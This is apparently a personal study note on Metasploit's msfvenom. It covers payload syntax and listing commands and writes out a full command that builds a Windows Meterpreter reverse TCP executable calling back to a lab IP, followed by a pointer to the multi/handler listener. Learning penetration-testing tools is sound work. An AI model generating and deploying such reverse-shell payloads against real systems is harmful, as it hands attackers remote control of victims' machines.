# What is msfvenom?

**msfvenom** is a tool included with the Metasploit Framework that is used to:

## Generate Payloads

Examples include:

- Reverse Shells
- Meterpreter Payloads
- Executable Files
- Shellcode

---

# Generating a Payload

## General Syntax

```bash
msfvenom -p PAYLOAD LHOST=IP LPORT=PORT -f FORMAT > FILE
```

Where:

- `-p` specifies the payload.
- `LHOST` is the attacker's IP address.
- `LPORT` is the listening port.
- `-f` specifies the output format.
- `>` saves the generated payload to a file.

---

# List Available Payloads

To display all available payloads:

```bash
msfvenom -l payloads
```

or

```bash
msfvenom --list payloads
```

![[Pasted image 20260524224708.png]]

---

# List Supported Output Formats

To display all supported output formats:

![[Pasted image 20260524224801.png]]

---

# Generate a 64-bit Windows Payload

```bash
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.227.128 LPORT=4444 -f exe > payload.exe
```

This generates a **64-bit Windows Meterpreter reverse TCP payload** in executable (`.exe`) format.

![[Pasted image 20260524225511.png]]

---

# Generate a 32-bit Windows Payload

![[Pasted image 20260524225634.png]]

---

# Generate a Linux Payload

![[Pasted image 20260524230049.png]]

---

# Start a Listener in Metasploit

After generating the payload, you need a listener to receive the incoming reverse connection.

This is typically done using the **Multi/Handler** module in Metasploit.

![[Pasted image 20260524230350.png]]